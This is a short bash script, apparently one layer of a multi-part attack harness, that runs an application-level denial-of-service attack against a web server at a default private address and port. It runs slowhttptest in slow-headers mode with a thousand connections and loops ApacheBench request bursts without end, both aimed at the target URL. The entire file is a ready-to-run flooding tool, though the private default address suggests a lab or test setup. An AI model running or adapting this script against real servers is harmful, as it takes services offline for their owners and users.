#!/bin/bash
# Bottom layer: application-level denial of service against the web server.
set -euo pipefail
source "$(dirname "$0")/lib.sh"

TARGET="${TARGET:-10.0.3.2}"
PORT="${PORT:-5000}"

need slowhttptest
need ab
echo "attacking webserver ${TARGET}:${PORT} for ${DURATION}s"

launch "slowhttptest slow headers" \
  slowhttptest -c 1000 -H -i 10 -r 200 -t GET \
               -u "http://${TARGET}:${PORT}/" -x 24 -p 3 -l "${DURATION}"

launch "ab request burst" bash -c "
  while true; do ab -n 50000 -c 200 'http://${TARGET}:${PORT}/'; done"

finish
